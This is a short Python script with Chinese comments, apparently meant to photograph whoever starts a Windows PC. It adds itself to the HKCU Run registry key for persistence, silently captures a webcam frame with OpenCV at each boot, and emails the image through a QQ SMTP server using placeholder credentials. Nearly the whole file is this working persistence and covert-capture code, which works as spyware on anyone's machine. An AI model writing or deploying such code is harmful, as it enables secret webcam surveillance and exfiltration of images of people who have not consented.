'''
本文件设计于获取开机后的照片
流程:复制到电脑后的D盘根目录后打开软件,然后会收到测试邮件,下次开机后将自动打开该软件,并获取照片发送到指定邮箱
'''

import cv2
import smtplib
import sys
import os
import time
import win32api
import win32con
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


host = "smtp.qq.com"    #发服务器接口
port = 25               #端口号
sender = "xxxxxxxx@qq.com" #消息发送方
pwd = "xxxxxxxx"   #授权码
receiver = "xxxxx@qq.com"  #消息接收方
exit_count = 5     #尝试联网次数
# path = os.getcwd()  #获取图片保存路径  返回当前进程的工作目录
path = "D:"       #文件路径

# def mkdir(path):                 #创建文件夹路径
# 	folder = os.path.exists(path)
# 	if folder:
# 		print ("Have Done")
# 	else:
# 		os.mkdir(path)
# 		print ("New Folder")

def GetPicture():                 #拍照
	cap = cv2.VideoCapture(0)
	ret,frame = cap.read()
	cv2.imwrite(path+'/person.jpg',frame)
	cap.release

def SetMsg():         #邮件格式设置
	msg = MIMEMultipart("mixed")
	msg['Subject'] = '电脑启动'  #标题
	msg['From'] = sender
	msg['To'] = receiver
	#邮件正文
	text = "您的电脑已开机!已经为你获取开机照片"
	text_plain = MIMEText(text,'plain','utf-8')      #正文转码
	msg.attach(text_plain)
	#构造图片链接
	SendImageFile = open(path+'/person.jpg','rb').read()
	image = MIMEImage(SendImageFile)
	#将收件人看见的附件照片名称改为people.png.
	image['Content-Disposition'] = 'attachment; filename = "people.png"'
	msg.attach(image)
	return msg.as_string()

def SendEmail(msg):			#发送邮件	
	smtp = smtplib.SMTP()
	smtp.connect(host)
	smtp.login(sender,pwd)
	smtp.sendmail(sender,receiver,msg)
	time.sleep(2)
	smtp.quit()

class AutoRun():             #添加开机启动项
    def __init__(self):
        name = 'Test'  # 要添加的项值名称
        AutoPath = path + '\\GetImage.exe'  # 要添加的exe路径
        # 注册表项名
        KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        # 异常处理
        try:
            key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,  KeyName, 0,  win32con.KEY_ALL_ACCESS)
            win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, AutoPath)
            win32api.RegCloseKey(key)
        except:
            print('添加失败')
        print('添加成功！')

# def IsLink():     #判断网络是否连通
# 	return os.system('ping -c 4 www.baidu.com')

# def main():       #主函数
# 	reconnect_times = 0
# 	# while IsLink():
# 	# 	time.sleep(10)
# 	# 	reconnect_times += 1
# 	# 	if reconnect_times == exit_count:
# 	# 		sys.exit()
# 	# time.sleep(10)
	# GetPicture()
	# msg = SetMsg()
	# SendEmail(msg)

if __name__ == '__main__':
	# mkdir(path)        #先设置路径
	auto = AutoRun()   #设置开机自启动
	GetPicture()       #拍照
	msg = SetMsg()	   #设置格式
	SendEmail(msg)	   #发送

